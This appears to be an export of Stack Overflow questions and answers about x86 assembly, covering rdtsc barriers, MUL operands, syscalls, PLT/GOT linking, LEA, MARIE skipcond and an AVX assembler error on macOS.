<p><strong>1:</strong> <code>rdtscp</code> is a serializing call. It prevents reordering around the call to rdtscp.</p>

<pre><code>__asm__ __volatile__(""rdtscp; ""         // serializing read of tsc
                     ""shl $32,%%rdx; ""  // shift higher 32 bits stored in rdx up
                     ""or %%rdx,%%rax""   // and or onto rax
                     : ""=a""(tsc)        // output to tsc variable
                     :
                     : ""%rcx"", ""%rdx""); // rcx and rdx are clobbered
</code></pre>

<p>However, <code>rdtscp</code> is only available on newer CPUs. So in this case we have to use <code>rdtsc</code>. But <code>rdtsc</code> is non-serializing, so using it alone will not prevent the CPU from reordering it.</p>

<p>So we can use either of these two options to prevent reordering:</p>

<p><strong>2:</strong> This is a call to <code>cpuid</code> and then <code>rdtsc</code>. <code>cpuid</code> is a serializing call.</p>

<pre><code>volatile int dont_remove __attribute__((unused)); // volatile to stop optimizing
unsigned tmp;
__cpuid(0, tmp, tmp, tmp, tmp);                   // cpuid is a serialising call
dont_remove = tmp;                                // prevent optimizing out cpuid

__asm__ __volatile__(""rdtsc; ""          // read of tsc
                     ""shl $32,%%rdx; ""  // shift higher 32 bits stored in rdx up
                     ""or %%rdx,%%rax""   // and or onto rax
                     : ""=a""(tsc)        // output to tsc
                     :
                     : ""%rcx"", ""%rdx""); // rcx and rdx are clobbered
</code></pre>

<p><strong>3:</strong> This is a call to <code>rdtsc</code> with <code>memory</code> in the clobber list, which prevents reordering</p>

<pre><code>__asm__ __volatile__(""rdtsc; ""          // read of tsc
                     ""shl $32,%%rdx; ""  // shift higher 32 bits stored in rdx up
                     ""or %%rdx,%%rax""   // and or onto rax
                     : ""=a""(tsc)        // output to tsc
                     :
                     : ""%rcx"", ""%rdx"", ""memory""); // rcx and rdx are clobbered
                                                  // memory to prevent reordering
</code></pre>

<p>My understanding for the 3rd option is as follows:</p>

<p>Making the call <code>__volatile__</code> prevents the optimizer from removing the asm or moving it across any instructions that could need the results (or change the inputs) of the asm. However it could still move it with respect to unrelated operations. So <code>__volatile__</code> is not enough.</p>

<p>Tell the compiler memory is being clobbered: <code>: ""memory"")</code>. The <code>""memory""</code> clobber means that GCC cannot make any assumptions about memory contents remaining the same across the asm, and thus will not reorder around it.</p>

<p>So my questions are:</p>

<ul>
<li>1: Is my understanding of <code>__volatile__</code> and <code>""memory""</code> correct?</li>
<li>2: Do the second two calls do the same thing?</li>
<li>3: Using <code>""memory""</code> looks much simpler than using another serializing instruction. Why would anyone use the 3rd option over the 2nd option?</li>
</ul>
","<p>As mentioned in a comment, there's a difference between a <em>compiler barrier</em> and a <em>processor barrier</em>. <code>volatile</code> and <code>memory</code> in the asm statement act as a compiler barrier, but the processor is still free to reorder instructions. </p>

<p>Processor barrier are special instructions that must be explicitly given, e.g. <code>rdtscp, cpuid</code>, memory fence instructions (<code>mfence, lfence,</code> ...) etc.</p>

<p>As an aside, while using <code>cpuid</code> as a barrier before <code>rdtsc</code> is common, it can also be very bad from a performance perspective, since virtual machine platforms often trap and emulate the <code>cpuid</code> instruction in order to impose a common set of CPU features across multiple machines in a cluster (to ensure that live migration works). Thus it's better to use one of the memory fence instructions. </p>

<p>The Linux kernel uses <code>mfence;rdtsc</code> on AMD platforms and <code>lfence;rdtsc</code> on Intel. If you don't want to bother with distinguishing between these, <code>mfence;rdtsc</code> works on both although it's slightly slower as <code>mfence</code> is a stronger barrier than <code>lfence</code>.</p>
","12634857"
"what does the assembly instruction 'db' actually do?","19892","","<p>I'm a bit confused as to what the asm instruction db actually does. I've read that it defines a byte, but what does that actually mean? Does it move the value into a certain place in memory, or does it predefine a value before the code is assembled? </p>
","<p>It literally places that byte right there in the executable.</p>
","17387615"
"x86 assembly multiply and divide instruction operands, 16-bit and higher","19742","","<p>I'm rather confused about how the multiply and divide operations work in x86 assembly. For example, the code below doesn't seem too difficult since deals with 8-bit.</p>

<p>8-Bit Multiplication:</p>

<pre><code>; User Input:
; [num1], 20
; [num2] , 15

mov    ax, [num1]    ; moves the 8 bits into AL
mov    bx, [num2]    ; moves the 8 bits into BL

mul    bl            ; product stored in AX

print  ax
</code></pre>

<p>But what happens when you want to multiply two 16-bit numbers? How would one multiply two 16 bit numbers the same way as it has been done with the 8 bit numbers?</p>

<p>I'm confused as to what registers the values would be stored in. Would they be stored in AL and AH or would it simply store the 16-bit number in AX. To show what I mean:</p>

<pre><code>; User Input:
; [num1], 20
; [num2], 15

mov    eax, [num1]    ; Does this store the 16-bit number in AL and AH or just in AX
mov    ebx, [num2]    ; Does this store the 16-bit number in BL and BH or just in BX

mul    ???            ; this register relies on where the 16-bit numbers are stored

print  eax
</code></pre>

<p>Could someone elaborate a bit on how the multiplying and dividing works? (specifically with 16-bit and 32-bit numbers? Would I need to rotate bits if the values are stored in the lower AL and AH?</p>

<p>Or can one simply <code>mov num1</code> and <code>num2</code> into <code>ax</code> and <code>bx</code> respectively and then multiply them to get the product in <code>eax</code>?</p>
","<p>A quick glance at the <a href=""http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html"" rel=""noreferrer"">documentation</a> shows that there are 4 possible operand sizes for <code>MUL</code>.  The inputs and outputs are summarized in a handy table:</p>

<pre><code>------------------------------------------------------
| Operand Size | Source 1 | Source 2   | Destination |
------------------------------------------------------
| Byte         | AL       | r/m8       | AX          |
| Word         | AX       | r/m16      | DX:AX       |
| Doubleword   | EAX      | r/m32      | EDX:EAX     |
| Quadword     | RAX      | r/m64      | RDX:RAX     |
------------------------------------------------------
</code></pre>
","9794682"
"Is it possible to create threads without system calls in Linux x86 GAS assembly?","19741","","<p>Whilst learning the ""assembler language"" (in linux on a x86 architecture using the GNU as assembler), one of the aha moments was the possibility of using <a href=""http://www.ibm.com/developerworks/linux/library/l-system-calls/"" rel=""noreferrer"">system calls</a>. These system calls come in very handy and are sometimes even necessary as your program <a href=""http://en.wikipedia.org/wiki/Kernel_mode#Supervisor_mode"" rel=""noreferrer"">runs in user-space</a>.<br>
However system calls are rather expensive in terms of performance as they require an interrupt (and of course a system call) which means that a context switch must be made from your current active program in user-space to the system running in kernel-space.</p>

<p>The point I want to make is this: I'm currently implementing a compiler (for a university project) and one of the extra features I wanted to add is the support for multi-threaded code in order to enhance the performance of the compiled program. Because some of the multi-threaded code will be automatically generated by the compiler itself, this will almost guarantee that there will be really tiny bits of multi-threaded code in it as well. In order to gain a performance win, I must be sure that using threads will make this happen.</p>

<p>My fear however is that, in order to use threading, I <em>must</em> make system calls and the necessary interrupts. The tiny little (auto-generated) threads will therefore be highly affected by the time it takes to make these system calls, which could even lead to a performance loss...</p>

<p><strong>my question is therefore twofold (with an extra bonus question underneath it):</strong>  </p>

<ul>
<li>Is it possible to write assembler
code which can run multiple threads
simultaneously on multiple cores at
once, <em>without</em> the need of system
calls?</li>
<li>Will I get a performance gain if I have really tiny threads (tiny as in the total execution time of the thread), performance loss, or isn't it worth the effort at all?</li>
</ul>

<p>My guess is that multithreaded assembler code is <em>not</em> possible without system calls. Even if this is the case, do you have a suggestion (or even better: some real code) for implementing threads as efficient as possible?</p>
","<p>The short answer is that you can't.  When you write assembly code it runs sequentially (or with branches) on one and only one logical (i.e. hardware) thread.  If you want some of the code to execute on another logical thread (whether on the same core, on a different core on the same CPU or even on a different CPU), you need to have the OS set up the other thread's instruction pointer (<code>CS:EIP</code>) to point to the code you want to run.  This implies using system calls to get the OS to do what you want.</p>

<p>User threads won't give you the threading support that you want, because they all run on the same hardware thread.</p>

<p><strong>Edit:</strong> Incorporating Ira Baxter's answer with <em>Parlanse</em>.  If you ensure that your program has a thread running in each logical thread to begin with, then you can build your own scheduler without relying on the OS.  Either way, you need a scheduler to handle hopping from one thread to another.  Between calls to the scheduler, there are no special assembly instructions to handle multi-threading.  The scheduler itself can't rely on any special assembly, but rather on conventions between parts of the scheduler in each thread.  </p>

<p>Either way, whether or not you use the OS, you still have to rely on some scheduler to handle cross-thread execution.</p>
","995071"
"Meaning of (%eax) in AT&T syntax?","19739","","<p>You'll have to excuse me, I'm brand new to x86 assembly, and assembly in general.</p>

<p>So my question is, I have something like:</p>

<pre><code>addl %edx,(%eax)
</code></pre>

<p>%eax is a register which holds a pointer to some integer. Let's call it xp</p>

<p>Does this mean that it's saying: <code>*xp = *xp + %edx</code>? (<code>%edx</code> is an integer)</p>

<p>I'm just confused where addl will store the result. If <code>%eax</code> is a pointer to an int, then <code>(%eax)</code> should be the actual value of that int. So would <code>addl</code> store the result of <code>%edx+(%eax)</code> in <code>*xp</code>? I would really love for someone to explain this to me!</p>

<p>I really appreciate any help!</p>
","<p>Yes, this instruction is doing exactly what you think it's doing.</p>

<p>Most x86 arithmetic instructions take two operands: a source and a destination. In AT&amp;T syntax (used here), the destination is always the right operand. So with an instruction like:</p>

<pre><code>addl %edx, %eax
</code></pre>

<p>the values in <code>edx</code> and <code>eax</code> are added together and the result is stored in <code>eax</code>. However, in your example, <code>(%eax)</code> is a memory operand; that's what parentheses mean in AT&amp;T syntax (like square-brackets in NASM syntax).</p>

<p>This means that <code>eax</code> is treated as a pointer, so the right operand is taken from the address pointed to by <code>eax</code>, and the result is stored to the same address.</p>
","1619153"
"How does `Skipcond` work in the MARIE assembly language?","19565","","<p>I am trying to understand the MARIE assembly language. I don't quite understand <code>skipcond</code> for
doing things like <code>&lt;</code>, or <code>&gt;</code>, or multiply or divide.</p>

<p>I am taking this simple program:</p>

<pre><code>x = 1
while x &lt; 10 do
x  = x +1
endwhile;
</code></pre>

<p>What I don't understand is how to use certain skip conditions:</p>

<pre><code>Skipcond 800 if AC &gt; 0,
Skipcond 400 if AC = 0,
Skipcond 000 if AC &lt; 0
</code></pre>

<p>Now, I know I would subtract x from 10 and test using skipcond.</p>

<p>I am not sure which one and why. I guess if I knew how they really work maybe it would be easier to understand. Why is it used to compare to zero?</p>

<p>This is what I have:</p>

<pre><code>100     load one
101     store x
102     subt ten
103     skipcond400  if x-10 = 0?   // or skpcond000 x -10 &lt; 0?? 
</code></pre>
","<pre><code>while x &lt; 10 do
    x  = x + 1
</code></pre>

<p>will jump out of the loop as soon as x equals 10. If you subtract 10 from x, you'll get a negative value until x equals 10 (and the value is 0). So using <code>skpcond000</code> would be wrong as it would jump out too soon. So <code>skpcond400</code> is correct.</p>

<p>Perhaps it is easier to understand if you change the C code so it will be closer to the assembly code:</p>

<pre><code>Original:            while (x &lt; 10) do
Subtract 10:         while ((x - 10) &lt; 0) do
Use != instead of &lt;: while ((x - 10) != 0) do
</code></pre>

<p>Also note that you have to increase <code>x</code> <em>after</em> the condition to reproduce identical behaviour to the <code>while</code> loop.</p>
","5137407"
"Read and print user input with x86 assembly (GNU/Linux)","19355","","<p>I'm learning x86 assembly on GNU/Linux, and I'm trying to write a program that reads user input from stdin and prints it on stdout.</p>

<p>The following code does work, but it prints extra characters if the size of the user-entered string is less than 100 bytes.</p>

<pre><code>section .data
    str: db 100    ; Allocate buffer of 100 bytes

section .bss

section .text

global _start

_start:
    mov eax, 3          ; Read user input into str 
    mov ebx, 0          ; |
    mov ecx, str        ; | &lt;- destination
    mov edx, 100        ; | &lt;- length
    int 80h             ; \

    mov eax, 4          ; Print 100 bytes starting from str
    mov ebx, 1          ; |
    mov ecx, str        ; | &lt;- source
    mov edx, 100        ; | &lt;- length
    int 80h             ; \ 

    mov eax, 1          ; Return
    mov ebx, 0          ; | &lt;- return code
    int 80h             ; \
</code></pre>

<p>How can I reliably calculate the length of the user-entered string? </p>

<p>How can I avoid printing extra characters?</p>
","<p><code>str: db 100</code> is wrong. You allocated <strong>one</strong> byte with the value 100. Correct is: <code>str: times 100 db 0</code> to allocate 100 bytes with the value 0.</p>

<p>You've got two problems:</p>

<p>1) To get the number of inputted bytes you can evaluate the return value of the read-function (int 80h / fn 3) in <code>EAX</code>.</p>

<p>2) If you input more characters than ""allowed"" the rest is stored in the input buffer which you have to empty. A possible method to do this is in the following example:</p>

<pre><code>global _start

section .data
    str: times 100 db 0 ; Allocate buffer of 100 bytes
    lf:  db 10          ; LF for full str-buffer

section .bss
    e1_len resd 1
    dummy resd 1

section .text

_start:
    mov eax, 3          ; Read user input into str
    mov ebx, 0          ; |
    mov ecx, str        ; | &lt;- destination
    mov edx, 100        ; | &lt;- length
    int 80h             ; \

    mov [e1_len],eax    ; Store number of inputted bytes
    cmp eax, edx        ; all bytes read?
    jb .2               ; yes: ok
    mov bl,[ecx+eax-1]  ; BL = last byte in buffer
    cmp bl,10           ; LF in buffer?
    je .2               ; yes: ok
    inc DWORD [e1_len]  ; no: length++ (include 'lf')

    .1:                 ; Loop
    mov eax,3           ; SYS_READ
    mov ebx, 0          ; EBX=0: STDIN
    mov ecx, dummy      ; pointer to a temporary buffer
    mov edx, 1          ; read one byte
    int 0x80            ; syscall
    test eax, eax       ; EOF?
    jz .2               ; yes: ok
    mov al,[dummy]      ; AL = character
    cmp al, 10          ; character = LF ?
    jne .1              ; no -&gt; next character
    .2:                 ; end of loop

    mov eax, 4          ; Print 100 bytes starting from str
    mov ebx, 1          ; |
    mov ecx, str        ; | &lt;- source
    mov edx, [e1_len]   ; | &lt;- length
    int 80h             ; \

    mov eax, 1          ; Return
    mov ebx, 0          ; | &lt;- return code
    int 80h             ; \
</code></pre>
","23469594"
"What does @plt mean here?","19219","","<pre><code>0x00000000004004b6 &lt;main+30&gt;:   callq  0x400398 &lt;printf@plt&gt;
</code></pre>

<p>Anyone knows?</p>

<p><strong>UPDATE</strong></p>

<p>Why two <code>disas printf</code> give me different result?</p>

<pre><code>(gdb) disas printf
Dump of assembler code for function printf@plt:
0x0000000000400398 &lt;printf@plt+0&gt;:  jmpq   *0x2004c2(%rip)        # 0x600860 &lt;_GLOBAL_OFFSET_TABLE_+24&gt;
0x000000000040039e &lt;printf@plt+6&gt;:  pushq  $0x0
0x00000000004003a3 &lt;printf@plt+11&gt;: jmpq   0x400388

(gdb) disas printf
Dump of assembler code for function printf:
0x00000037aa44d360 &lt;printf+0&gt;:  sub    $0xd8,%rsp
0x00000037aa44d367 &lt;printf+7&gt;:  mov    %rdx,0x30(%rsp)
0x00000037aa44d36c &lt;printf+12&gt;: movzbl %al,%edx
0x00000037aa44d36f &lt;printf+15&gt;: mov    %rsi,0x28(%rsp)
0x00000037aa44d374 &lt;printf+20&gt;: lea    0x0(,%rdx,4),%rax
0x00000037aa44d37c &lt;printf+28&gt;: lea    0x3f(%rip),%rdx        # 0x37aa44d3c2 &lt;printf+98&gt;
</code></pre>
","<p>It's a way to get code fixups (adjusting addresses based on where the code sits in virtual memory) without having to maintain a separate copy of the code for each process. The PLT is the procedure linkage table, one of the structures which makes dynamic loading and linking easier to use.</p>

<p><code>printf@plt</code> is actually a small stub which (eventually) calls the real <code>printf</code> function.</p>

<p>This real function may be mapped into <em>any</em> location in a given process (virtual address space) as can the code that calls it.</p>

<p>So, in order to allow proper code sharing of calling code (left side below), you don't want to apply any fixups to it directly since that will restrict where it can be located in <em>other</em> processes.</p>

<p>The <code>PLT</code> is a smaller <em>process-specific</em> area at a reliably-calculated-at-runtime address that <em>isn't</em> shared between processes so any given process can change it however it wants to.</p>

<p>In other words, examine the following diagram which shows both your code and the library code mapped to different virtual addresses in two processes:</p>

<pre><code>         Mapped to: 0x1234     0x9000     0x8888
        +-----------------+ +----------+ +----------+
        |                 | | Private  | |          |
ProcA   |                 | |  PLT/GOT | |          |
        |                 | |   area   | |          |
        | Shared          | +----------+ | Shared   |
========|  application    |==============|  library |==
        |   code          | +----------+ |   code   |
        |                 | | Private  | |          |
ProcB   |                 | |  PLT/GOT | |          |
        |                 | |   area   | |          |
        +-----------------+ +----------+ +----------+
         Mapped to: 0x2020     0x9000     0x6666
</code></pre>

<p>This particular example shows a simple case where the PLT maps to a fixed location. In your scenario, it's located relative to the current program counter as evidenced by your program-counter-relative lookup:</p>

<pre><code>&lt;printf@plt+0&gt;: jmpq  *0x2004c2(%rip)  ; 0x600860 &lt;_GOT_+24&gt;
</code></pre>

<p>A good article can be found <a href=""http://dustin.schultz.io/blog/2010/10/02/how-is-glibc-loaded-at-runtime/"" rel=""noreferrer"">here</a>, detailing how <code>glibc</code> is loaded at run time.</p>

<p>Basically, the original way in which shared code was made meant it they had to be loaded at the same memory location in the virtual address space of every process that used it. Either that or it couldn't be shared, since the act of fixing up the <em>single</em> shared copy for one process would totally stuff up another process where it was mapped to a different location.</p>

<p>By using position independent code, along with the PLT and a global offset table (GOT), the <em>first</em> call to a function <code>printf@plt</code> (in the PLT) is a multi-stage operation, in which:</p>

<ul>
<li>you call <code>printf@plt</code> in the PLT.</li>
<li>it calls the GOT version (via pointer) which <em>initially</em> points back to some set-up code in the PLT.</li>
<li>this set-up code loads the relevant shared library if not yet done, then <em>modifies</em> the GOT so that subsequent calls directly to the real <code>printf</code> rather than the set-up code.</li>
</ul>

<p>On subsequent calls, because the GOT has been modified, the multi-stage approach is simplified:</p>

<ul>
<li>you call <code>printf@plt</code> in the PLT.</li>
<li>it calls the GOT version (via pointer) which points to the <em>real</em> <code>printf</code>.</li>
</ul>
","5469334"
"What is global _start in assembly language?","19190","","<p>This is my assembly level code ...</p>

<pre><code>section .text
global _start
_start: mov eax, 4
        mov ebx, 1
        mov ecx, mesg
        mov edx, size
        int 0x80
exit:   mov eax, 1
        int 0x80
section .data
mesg    db      'KingKong',0xa
size    equ     $-mesg
</code></pre>

<p>Output:</p>

<pre><code>root@bt:~/Arena# nasm -f elf a.asm -o a.o
root@bt:~/Arena# ld -o out a.o
root@bt:~/Arena# ./out 
KingKong
</code></pre>

<p>My question is <strong>What is the global _start used for</strong>? I tried my luck with Mr.Google and I found that it is used to tell the starting point of my program. Why cant we just have the <code>_start</code> to tell where the program starts like the one given below which produces a kinda
warning on the screen</p>

<pre><code>section .text
_start: mov eax, 4
        mov ebx, 1
        mov ecx, mesg
        mov edx, size
        int 0x80
exit:   mov eax, 1
        int 0x80
section .data
mesg    db      'KingKong',0xa
size    equ     $-mesg

root@bt:~/Arena# nasm -f elf a.asm
root@bt:~/Arena# ld -e _start -o out a.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048080
root@bt:~/Arena# ld -o out a.o
ld: warning: cannot find entry symbol _start; defaulting to 0000000008048080
</code></pre>
","<p><code>global</code> directive is NASM specific. It is for exporting symbols in your code to where it points in the object code generated. Here you mark <code>_start</code> symbol global so its name is added in the object code (<code>a.o</code>). The linker (<code>ld</code>) can read that symbol in the object code and its value so it knows where to mark as an entry point in the output executable. When you run the executable it starts at where marked as <code>_start</code> in the code.</p>

<p>If a <code>global</code> directive missing for a symbol that symbol will not be placed in the object code's export table so linker has no way of knowing about the symbol. </p>

<p>If you want to use a different entry point name than <code>_start</code> (which is the default), you can specify <code>-e</code> parametre to ld like:</p>

<pre><code>ld -e my_entry_point -o out a.o
</code></pre>
","17899048"
"trouble understanding assembly command ""load effective address""","19147","","<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""https://stackoverflow.com/questions/1658294/whats-the-purpose-of-the-lea-instruction"">What’s the purpose of the LEA instruction?</a><br>
  <a href=""https://stackoverflow.com/questions/4534617/lea-instruction"">LEA instruction?</a>  </p>
</blockquote>



<p>So I'm working on the binary bomb assignment for class (it has a bunch of phases where you have to step through the assembly code of a program and find a passphrase to decode the ""bomb"").</p>

<p>I can't complete my current phase because I don't understand the lea command. I've read that it's commonly used for arithmetic, but I just don't understand how it does it. </p>

<p>The command I'm looking at in particular is</p>

<pre><code>lea -0x18(%ebp), %ebx
lea -0x8(%ebp), %esi
</code></pre>

<p>followed by a</p>

<pre><code>mov -0x4 (%ebx), %eax
add -0x8(%ebx), %eax
</code></pre>

<p>in the next line eax and ebx are compared, if they're equal the program continues, else the bomb explodes. </p>

<p>I've figured enough out about this phase to know it wants 6 numbers, the first two being 0 and 1. After that it does some manipulations to determine if the rest of the sequence is correct (I'm assuming the lea commands are what i need to decode to find the next numbers).  </p>

<p>Now what I couldn't find is what the -0x18 in particular refers to. what's the negative sign do? does it indicate subtraction? is it looking 18 bytes before ebp?</p>

<p>Thanks for any help here. </p>
","<p>The LEA instruction computes a memory address using the same arithmetic that a MOV instruction uses.  But unlike the MOV instruction, the LEA instruction just stores the computed address in its target register, instead of loading the contents of that address and storing it.</p>

<p>Consider your first LEA instruction:</p>

<pre><code>lea -0x18(%ebp), %ebx
</code></pre>

<p>This instruction computes the sum of -0x18 and the value in the EBP register.  It gets some result S.  It stores S in the EBX register.</p>

<p>In the addend -0x18, the “-” is a negative sign and the “0x” means it's a hexadecimal constant.  So the addend is negative 18<sub>16</sub>, which is -24<sub>10</sub>.  So this LEA instruction simply subtracts 24 from the value in EBP and stores the result in EBX.</p>

<p>Contrast this with your MOV instruction:</p>

<pre><code>mov -0x4(%ebx), %eax
</code></pre>

<p>This instruction computes the sum of -0x4 and the value in the EBX register.  It gets some result S.  Then it fetches the value of the word at address S in memory, getting some value M.  It stores M in the EAX register.</p>
","12869829"
"How many ways to set a register to zero?","19033","","<p>I'm curious how many ways are there to set a register to zero in x86 assembly. Using one instruction. Someone told me that he managed to find at least 10 ways to do it.</p>

<p>The ones I can think of are:</p>

<pre><code>xor ax,ax
mov ax, 0
and ax, 0
</code></pre>
","<p>There are a lot of possibility how to mov 0 in to ax under IA32...</p>

<pre><code>    lea eax, [0]
    mov eax, 0FFFF0000h         //All constants form 0..0FFFFh &lt;&lt; 16
    shr eax, 16                 //All constants form 16..31
    shl eax, 16                 //All constants form 16..31
</code></pre>

<p>And perhaps the most strange... :)</p>

<pre><code>@movzx:
    movzx eax, byte ptr[@movzx + 6]   //Because the last byte of this instruction is 0
</code></pre>

<p>and...</p>

<pre><code>  @movzx:
    movzx ax, byte ptr[@movzx + 7]
</code></pre>

<p><strong>Edit:</strong> </p>

<p>And for 16 bit x86 cpu mode, not tested...:</p>

<pre><code>    lea  ax, [0]
</code></pre>

<p>and...</p>

<pre><code>  @movzx:
    movzx ax, byte ptr cs:[@movzx + 7]   //Check if 7 is right offset
</code></pre>

<p>The <strong>cs:</strong> prefix is optional in case that the <strong>ds</strong> segment register  is not equal to cs segment register.</p>
","4831763"
"Error ""no such instruction"" while assembling project on Mac OS X","18949","","<p>I used homebrew to install GCC 4.7.0 and my project's make is failing at assembly-time. I can successfully take code from .c -> .s, but .s -> .o fails.</p>

<p>To view the brew formula used to install GCC, please look at: <a href=""https://github.com/Homebrew/homebrew-dupes/blob/master/gcc.rb"" rel=""nofollow noreferrer"">https://github.com/Homebrew/homebrew-dupes/blob/master/gcc.rb</a> . I also installed binutils from upstream using <a href=""https://github.com/mxcl/homebrew/blob/master/Library/Formula/binutils.rb"" rel=""nofollow noreferrer"">https://github.com/mxcl/homebrew/blob/master/Library/Formula/binutils.rb</a> . Install binutils does not appear to introduce a new 'as' in the /usr/local/lib or similar.</p>

<p>How can I track down this missing instruction error? It appears the compiler is correct but the linker simply does not support these instructions. The instructions do appear to be vector instructions.</p>

<pre><code>xavierlange $&gt; make suricata.o
/usr/local/bin/gcc-4.7 -DHAVE_CONFIG_H -I. -I..  -I../libhtp  -I/opt/local/include  -v -Wextra -Wall -fno-strict-aliasing -fno-tree-pre -Wno-unused-parameter -std=gnu99 -DOS_DARWIN -march=native   -DLIBPCAP_VERSION_MAJOR=1 -DHAVE_PCAP_SET_BUFF -DUNITTESTS -DREVISION=""61d5fe3"" -MT suricata.o -MD -MP -MF .deps/suricata.Tpo -c -o suricata.o suricata.c
Using built-in specs.
COLLECT_GCC=/usr/local/bin/gcc-4.7
Target: x86_64-apple-darwin11.3.0
Configured with: ../configure --enable-languages=c,c++,fortran,java,objc,obj-c++ --prefix=/usr/local/Cellar/gcc/4.7.0/gcc --datarootdir=/usr/local/Cellar/gcc/4.7.0/share --bindir=/usr/local/Cellar/gcc/4.7.0/bin --program-suffix=-4.7 --with-gmp=/usr/local/Cellar/gmp/5.0.4 --with-mpfr=/usr/local/Cellar/mpfr/3.1.0 --with-mpc=/usr/local/Cellar/libmpc/0.9 --with-system-zlib --enable-stage1-checking --enable-plugin --enable-lto --disable-multilib --disable-nls
Thread model: posix
gcc version 4.7.0 (GCC) 
COLLECT_GCC_OPTIONS='-mmacosx-version-min=10.7.3' '-D' 'HAVE_CONFIG_H' '-I' '.' '-I' '..' '-I' '../libhtp' '-I' '/opt/local/include' '-v' '-Wextra' '-Wall' '-fno-strict-aliasing' '-fno-tree-pre' '-Wno-unused-parameter' '-std=gnu99' '-D' 'OS_DARWIN' '-march=native' '-D' 'LIBPCAP_VERSION_MAJOR=1' '-D' 'HAVE_PCAP_SET_BUFF' '-D' 'UNITTESTS' '-D' 'REVISION=61d5fe3' '-MT' 'suricata.o' '-MD' '-MP' '-MF' '.deps/suricata.Tpo' '-c' '-o' 'suricata.o'
 /usr/local/Cellar/gcc/4.7.0/gcc/libexec/gcc/x86_64-apple-darwin11.3.0/4.7.0/cc1 -quiet -v -I . -I .. -I ../libhtp -I /opt/local/include -MD suricata.d -MF .deps/suricata.Tpo -MP -MT suricata.o -D__DYNAMIC__ -D HAVE_CONFIG_H -D OS_DARWIN -D LIBPCAP_VERSION_MAJOR=1 -D HAVE_PCAP_SET_BUFF -D UNITTESTS -D REVISION=61d5fe3 suricata.c -march=corei7-avx -mcx16 -msahf -mno-movbe -maes -mpclmul -mpopcnt -mno-abm -mno-lwp -mno-fma -mno-fma4 -mno-xop -mno-bmi -mno-bmi2 -mno-tbm -mavx -mno-avx2 -msse4.2 -msse4.1 -mno-lzcnt --param l1-cache-size=32 --param l1-cache-line-size=64 --param l2-cache-size=6144 -mtune=corei7-avx -fPIC -quiet -dumpbase suricata.c -mmacosx-version-min=10.7.3 -auxbase-strip suricata.o -Wextra -Wall -Wno-unused-parameter -std=gnu99 -version -fno-strict-aliasing -fno-tree-pre -o /var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s
GNU C (GCC) version 4.7.0 (x86_64-apple-darwin11.3.0)
    compiled by GNU C version 4.7.0, GMP version 5.0.4, MPFR version 3.1.0-p8, MPC version 0.9
GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072
ignoring nonexistent directory ""/usr/local/Cellar/gcc/4.7.0/gcc/lib/gcc/x86_64-apple-darwin11.3.0/4.7.0/../../../../x86_64-apple-darwin11.3.0/include""
ignoring nonexistent directory ""/opt/local/include""
#include ""..."" search starts here:
#include &lt;...&gt; search starts here:
 .
 ..
 ../libhtp
 /usr/local/Cellar/gcc/4.7.0/gcc/lib/gcc/x86_64-apple-darwin11.3.0/4.7.0/include
 /usr/local/include
 /usr/local/Cellar/gcc/4.7.0/gcc/include
 /usr/local/Cellar/gcc/4.7.0/gcc/lib/gcc/x86_64-apple-darwin11.3.0/4.7.0/include-fixed
 /usr/include
 /System/Library/Frameworks
 /Library/Frameworks
End of search list.
GNU C (GCC) version 4.7.0 (x86_64-apple-darwin11.3.0)
    compiled by GNU C version 4.7.0, GMP version 5.0.4, MPFR version 3.1.0-p8, MPC version 0.9
GGC heuristics: --param ggc-min-expand=100 --param ggc-min-heapsize=131072
Compiler executable checksum: 1dbaf0f0ba4d4d18b5d0d00c3c7d024d
COLLECT_GCC_OPTIONS='-mmacosx-version-min=10.7.3' '-D' 'HAVE_CONFIG_H' '-I' '.' '-I' '..' '-I' '../libhtp' '-I' '/opt/local/include' '-v' '-Wextra' '-Wall' '-fno-strict-aliasing' '-fno-tree-pre' '-Wno-unused-parameter' '-std=gnu99' '-D' 'OS_DARWIN' '-march=native' '-D' 'LIBPCAP_VERSION_MAJOR=1' '-D' 'HAVE_PCAP_SET_BUFF' '-D' 'UNITTESTS' '-D' 'REVISION=61d5fe3' '-MT' 'suricata.o' '-MD' '-MP' '-MF' '.deps/suricata.Tpo' '-c' '-o' 'suricata.o'
 as -arch x86_64 -force_cpusubtype_ALL -o suricata.o /var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7791:no such instruction: `vcvtsi2ssq %rax, %xmm0,%xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7792:no such instruction: `vmovd %xmm0, %eax'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7799:no such instruction: `vcvtsi2ssq %rdx, %xmm0,%xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7800:no such instruction: `vaddss %xmm0, %xmm0,%xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7801:no such instruction: `vmovd %xmm0, %eax'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7804:no such instruction: `vmovd %eax, %xmm1'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7805:no such instruction: `vmovd %edx, %xmm2'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7806:no such instruction: `vdivss %xmm2, %xmm1,%xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7807:no such instruction: `vunpcklps %xmm0, %xmm0,%xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7808:no such instruction: `vcvtps2pd %xmm0, %xmm0'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7809:no such instruction: `vmovd %xmm0, %rax'
/var/folders/58/wg28y0x17p5c3s6y_2t2rj2h0000gn/T//ccKRmuNX.s:7819:no such instruction: `vmovd %rax, %xmm0'
make: *** [suricata.o] Error 1
</code></pre>

